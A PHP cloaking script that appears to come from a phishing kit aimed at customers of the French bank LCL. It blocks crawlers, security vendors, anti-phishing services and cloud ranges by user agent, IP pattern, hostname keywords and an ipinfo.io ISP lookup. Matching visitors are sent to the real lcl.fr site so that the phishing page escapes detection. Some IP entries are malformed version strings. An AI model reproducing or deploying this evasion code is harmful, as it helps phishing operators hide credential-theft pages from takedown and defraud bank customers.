<?php $user_agent=$_SERVER['HTTP_USER_AGENT'];$user_ip=$_SERVER['REMOTE_ADDR'];$hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);$bots_agents=array('googlebot','yahoo','slurp','yahooSeeker','facebookexternalhit','ia_archiver','yandexbot','baiduspider','crawler','httrack','pycurl','python-requests','curl','wget','phish','Http Crawler');$bots_ips=array('1.9.2.13','1.9.2.15','62.210.13.58','104.62.2.60','104.83.233.198','107.178.194.64','108.161.29.60','115.238.55.18','119.97.214.138','138.197.207.*','145.239.156.71','145.239.156.89','150.70.168.35','150.70.188.167','154.127.57.30','162.243.128.197','162.243.187.126','162.243.69.215','165.227.0.128','170.250.139.48','138.197.207.147','173.230.147.44','177.39.232.144','178.17.170.156','185.104.186.168','185.220.101.26','185.28.20.243','188.166.63.71','192.36.27.7','196.52.84.81','204.13.201.137','208.87.233.140','212.83.139.219','212.92.117.5','216.164.117.239','217.16.26.166','217.96.188.74','219.117.238.170','23.27.153.247','23.27.154.37','24.23.24.144','27.0.1453.110','3.0.04506.648','3.0.4506.2152','31.168.158.239','34.237.113.113','39.0.2150.5','41.0.2272.118','43.0.2357.81','44.0.2403.155','46.101.94.163','5.62.39.18','5.62.41.35','5.62.56.91','50.112.194.65','50.116.2.167','51.0.2704.103','52.18.11.161','52.192.164.225','52.27.2.86','52.31.63.97','52.5.98.73','52.72.33.140','52.87.10.90','52.91.94.56','53.0.2785.116','54.213.103.141','54.228.218.117','54.245.191.79','56.0.2924.87','57.0.2987.98','61.0.3116.0','62.24.252.133','62.67.194.35','63.0.3239.132','64.0.3282.140','64.0.3282.167','66.0.3358.0','66.0.3359.0','67.0.3360.0','67.0.3361.0','68.65.53.71','75.163.12.85','76.19.184.88','77.69.251.230','80.104.176.17','81.0.48.*','81.0.48.138','84.13.191.239','84.92.148.184','88.99.62.141','217.96.197.246','89.234.157.254','91.231.212.111','97.85.126.186^66.102.*.*','^1.234.41.*','^104.108.64.175','^104.131.223.*','^107.170.*.*','^107.178.194.*','^107.178.195.*','^107.20.181.*','^108.162.215.*','^108.162.246.*','^109.186.*.*','^12.148.196.*','^12.148.209.*','^124.66.185.*','^128.242.*.*','^131.*.*.*','^131.212.*.*','^131.253.*.*','^133.11.204.*','^134.170.2.199','^141.101.104.*','^149.20.*.*','^149.20.54.*','^157.*.*.*','^157.54.*.*','^158.108.*.*','82.102.27.77','^162.158.*.*','^162.158.7.*','^162.158.72.*','^162.158.95.*','^167.24.*.*','^168.188.*.*','^173.194.*.*','^173.194.112.*','^173.194.116.102','^173.194.116.149','^173.245.55.*','^176.195.231.*','^178.43.117.*','^184.173.*.*','^185.2.138.*','^185.28.20.*','^188.165.83.*','^188.244.39.*','^192.115.134.*','^192.118.48.*','^192.232.213.*','^193.220.178.*','^193.221.113.53','^193.253.199.*','^193.47.80.*','^194.153.113.*','^194.52.68.*','^194.72.238.*','^194.90.*.*','^195.128.227.*','^198.25.*.*','^198.41.243.*','^198.54.*.*','^198.60.236.*','^199.30.228.*','^202.*.*.*','^202.108.252.*','^202.160.*.*','^204.*.*.*','^204.14.48.*','^206.207.*.*','^206.253.226.*','^206.28.72.*','^207.*.*.*','^207.126.144.*','^207.46.*.*','^207.46.8.167','^207.46.8.199','^207.68.*.*','^208.65.144.*','^208.76.45.53','^208.84.*.*','^208.91.115.*','^209.191.*.*','^209.73.228.*','^209.85.*.*','^209.85.128.*','^212.143.*.*','^212.150.*.*','^212.235.*.*','^212.29.192.*','^212.29.224.*','^212.50.193.*','^212.8.79.*','^213.*.*.*','^216.239.*.*','^216.239.32.*','^216.252.167.*','^216.33.229.163','^216.58.211.37','^217.132.*.*','^217.16.26.*','^217.74.103.*','^219.*.*.*','^37.128.131.171','^37.140.188.*','^38.100.*.*','^38.105.*.*','^38.144.36.*','^38.74.138.*','^46.116.*.* ','^46.244.*.*','^46.4.120.*','^50.7.*.*','^50.97.*.*','^54.176.*.*','^54.228.218.*','^62.116.207.*','^62.141.65.*','^62.90.*.*','^62.99.77.*','^63.*.*.*','^64.*.*.*','^64.106.213.*','^64.124.14.*','^64.18.*.*','^64.233.*.*','^64.233.160.*','^64.233.173.*','^64.233.191.*','^64.233.191.255*','^64.27.2.*','^64.37.103.*','^64.4.*.*','^64.62.136.*','^64.62.175.*','^64.68.90.*^81.161.59.*','^65.*.*.*','^65.52.*.*','^65.54.188.110','^65.54.188.126','^65.54.188.94','^65.55.206.154','^65.55.33.119','^65.55.33.135','^65.55.37.104','^65.55.37.120','^65.55.37.72','^65.55.37.88','^65.55.85.12','^65.55.92.136','^65.55.92.152','^65.55.92.168','^65.55.92.184','^66.102.*.*','^66.135.200.*','^66.150.14.*','^66.196.*.*','^66.205.64.*','^66.207.120.*','^66.211.160.86*','^66.211.169.3','^66.211.169.66','^66.221.*.*','^66.228.*.*','^66.249.*.*','^67.15.*.*','^67.195.*.*','^67.209.128.*','^68.*.*.*','^68.142.*.*','^68.65.53.71','^69.164.145.*','^69.61.12.*','^69.65.*.*','^72.14.*.*','^72.14.192.*','^72.30.*.*','^72.52.96.*','^74.125.*.*','^74.6.*.*','^78.148.13.*','^8.12.*.*','^82.166.*.*','^83.31.118.*','^83.31.69.*','^85.250.*.*','^85.64.*.*','^85.9.7.*','^87.106.251.*','^89.138.*.*','^89.163.159.214','^91.103.66.*','^91.231.*.*','^91.231.212.*','^92.103.69.*','^93.172.*.*','^93.54.82.*','^94.26.*.*','^95.108.194.*','^95.85.*.*','^98.136.*.*','185.104.120.4','212.83.170.209','87.115.213.2','82.223.27.82','163.172.174.24','37.187.96.202','92.103.69.158');$blocked_words=array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","avast");$shit_isps=array("DigitalOcean","Amazon","Google","phishtank","net4sec","AVAST Software s.r.o.","BullGuard ApS","PayPal","Hotmail","Yahoo","AOL","Microsoft","Kaspersky Lab","Linode, LLC","MSN","ONLINE S.A.S.","Joshua Peter McQuistan");foreach($bots_agents as $bot_agent){if(substr_count($user_agent,$bot_agent)>0){exit(header('Location: https://www.lcl.fr/'));}}foreach($bots_ips as $bot_ip){if(preg_match('/'.$bot_ip.'/',$user_ip)){exit(header('Location: https://www.lcl.fr/'));}}foreach($blocked_words as $word){if(substr_count($hostname,$word)>0){exit(header('Location: https://www.lcl.fr/'));}}$ipp=isset($user_ip)&&$user_ip!=""?$user_ip:"1.1.1.1";$ISP=@file_get_contents('http://ipinfo.io/'.$ipp.'/org');if($ISP==false){return "ppp";}foreach($shit_isps as $isp){if(substr_count($ISP,$isp)){exit(header('Location: https://www.lcl.fr/'));}}?>